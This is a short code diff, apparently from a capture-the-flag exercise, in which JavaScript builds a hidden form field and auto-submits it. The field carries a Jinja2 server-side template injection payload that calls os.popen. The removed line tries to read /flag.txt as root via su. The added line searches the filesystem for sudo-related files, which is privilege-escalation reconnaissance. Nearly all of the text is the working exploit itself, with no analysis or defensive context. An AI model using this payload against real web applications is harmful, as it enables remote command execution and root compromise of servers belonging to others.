@@ -14,7 +14,7 @@
       const i = document.createElement('input');
       i.type = 'hidden';
       i.name = 'comment';
-      i.value = `{{request.application.__globals__.__builtins__.__import__('os').popen('su root -c "cat /flag.txt"').read()}}`;
+      i.value = `{{request.application.__globals__.__builtins__.__import__('os').popen('find / -name "*sudo*" 2>/dev/null').read()}}`;
       f.appendChild(i);
       document.body.appendChild(f);
       f.submit();
